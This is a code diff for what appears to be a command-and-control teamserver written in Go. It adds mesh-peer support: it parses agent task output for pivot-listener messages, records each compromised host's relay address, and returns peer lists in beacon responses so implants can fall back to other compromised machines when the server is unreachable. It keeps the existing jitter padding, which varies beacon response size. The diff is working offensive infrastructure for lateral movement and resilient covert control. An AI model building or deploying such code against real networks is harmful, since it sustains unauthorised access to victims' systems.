@@ -12,6 +12,8 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"regexp"
+	"strconv"
 	"strings"
 )
 
@@ -46,9 +48,53 @@ type taskWire struct {
 // DataJitterMax controls random padding bytes added to beacon responses (0 = disabled).
 var DataJitterMax int
 
+// peerWire carries a mesh peer's relay address in beacon responses.
+type peerWire struct {
+	Addr  string `json:"addr"`
+	Proto string `json:"proto,omitempty"` // "http" or "tcp"
+}
+
 type beaconResponse struct {
 	Tasks   []taskWire `json:"tasks"`
+	Peers   []peerWire `json:"peers,omitempty"`
 	Padding string     `json:"_p,omitempty"`
+}
+
+// regexes for auto-detecting when an agent starts a pivot listener.
+var (
+	reHTTPPivot = regexp.MustCompile(`\[\+\] HTTP pivot listening on :(\d+)`)
+	reTCPPivot  = regexp.MustCompile(`\[\+\] TCP pivot listening on :(\d+)`)
+	reStopPivot = regexp.MustCompile(`\[\*\] (HTTP|TCP) pivot stopped`)
+)
+
+// maybeRegisterMeshPeer auto-registers or unregisters an agent based on pivot task results.
+func (s *Server) maybeRegisterMeshPeer(agentID, output string) {
+	if m := reHTTPPivot.FindStringSubmatch(output); m != nil {
+		port, _ := strconv.Atoi(m[1])
+		agent, err := s.db.GetAgent(agentID)
+		if err != nil {
+			return
+		}
+		addr := net.JoinHostPort(agent.IP, strconv.Itoa(port))
+		s.registerMeshPeer(agentID, addr, "http")
+		s.printf("[mesh] peer registered %s → %s (http)\n", agentID[:8], addr)
+		BroadcastGUI("MESH_PEER_UP", agentID, addr)
+	}
+	if m := reTCPPivot.FindStringSubmatch(output); m != nil {
+		port, _ := strconv.Atoi(m[1])
+		agent, err := s.db.GetAgent(agentID)
+		if err != nil {
+			return
+		}
+		addr := net.JoinHostPort(agent.IP, strconv.Itoa(port))
+		s.registerMeshPeer(agentID, addr, "tcp")
+		s.printf("[mesh] peer registered %s → %s (tcp)\n", agentID[:8], addr)
+		BroadcastGUI("MESH_PEER_UP", agentID, addr)
+	}
+	if reStopPivot.MatchString(output) {
+		s.unregisterMeshPeer(agentID)
+		BroadcastGUI("MESH_PEER_DOWN", agentID, "")
+	}
 }
 
 type resultRequest struct {
@@ -177,7 +223,12 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 		s.db.MarkTaskFetched(t.ID)
 	}
 
-	resp := beaconResponse{Tasks: wires}
+	// Include mesh peer list so agents can fall back to peers if teamserver unreachable.
+	var peers []peerWire
+	for _, p := range s.getMeshPeers(agentID) {
+		peers = append(peers, peerWire{Addr: p.Addr, Proto: p.Proto})
+	}
+	resp := beaconResponse{Tasks: wires, Peers: peers}
 	if DataJitterMax > 0 {
 		n := rand.Intn(DataJitterMax + 1)
 		if n > 0 {
@@ -221,6 +272,7 @@ func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	s.db.InsertResult(req.TaskID, agentID, req.Output, req.Error)
+	go s.maybeRegisterMeshPeer(agentID, req.Output)
 	w.WriteHeader(http.StatusOK)
 
 	if req.Output != "" {
